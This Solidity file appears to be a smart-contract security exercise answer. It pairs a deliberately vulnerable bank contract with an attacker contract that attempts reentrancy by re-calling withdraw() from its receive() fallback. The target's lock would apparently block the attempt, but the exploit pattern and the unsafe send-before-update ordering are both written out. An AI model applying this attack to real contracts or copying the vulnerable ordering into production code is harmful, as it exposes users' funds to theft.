// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableContract {
    mapping (address => uint) public balances;
    bool internal locked;

    modifier nonReentrancy() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }

    receive() external payable {}

    function deposit() public payable {
      balances[msg.sender] += msg.value;
    }

    function withdraw() public nonReentrancy {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool success, ) = msg.sender.call{value: bal}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
      return address(this).balance;
    }
}

contract answer52 {
  VulnerableContract public vc;
  uint256 amount = 1000000000 wei;

  receive() external payable {
    if (address(vc).balance >= 1000000000 wei) {
      vc.withdraw();
    }
  }
  constructor() payable {}

  function deployContract() external {
    vc = new VulnerableContract();
  }

  function getEth() external payable {}

  function sendETH() public {
    (bool success, ) = address(vc).call{value: 1000000000}("");   
    require(success, "sendETH not success");
  }

  function attack() public payable {
    vc.deposit{value: 1000000000}();
    vc.withdraw();
  }

  function getVcBalance() external view returns(uint256) {
    return vc.getBalance();
  }

}